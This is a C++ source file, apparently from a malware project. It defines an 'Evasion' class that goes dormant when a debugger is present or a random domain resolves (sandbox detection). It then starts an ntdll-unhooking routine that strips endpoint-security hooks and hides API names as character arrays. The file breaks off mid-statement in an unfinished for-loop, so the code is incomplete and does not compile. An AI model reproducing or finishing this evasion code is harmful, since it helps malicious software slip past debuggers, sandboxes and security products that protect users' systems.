#include "Utils.h"
#include "Evasion.h"

Evasion::Evasion() {
	if (Evasion::isBeingDebugging() || Evasion::isDomainReachable()) {
		this->mustBeAvoided = TRUE;
	}
};

BOOL Evasion::isBeingDebugging(void) {
	if (checkDebugger()) {
		return TRUE;
	}
	return FALSE;
}

BOOL Evasion::isDomainReachable(void) {
	std::string randomDomain = Utils::getRandomDomain();

	if (Utils::hostConnection(randomDomain, 80)) {
		return TRUE;
	}
	return FALSE;
}

int Evasion::unhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);

	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

	for (int i = 0; i < )
}
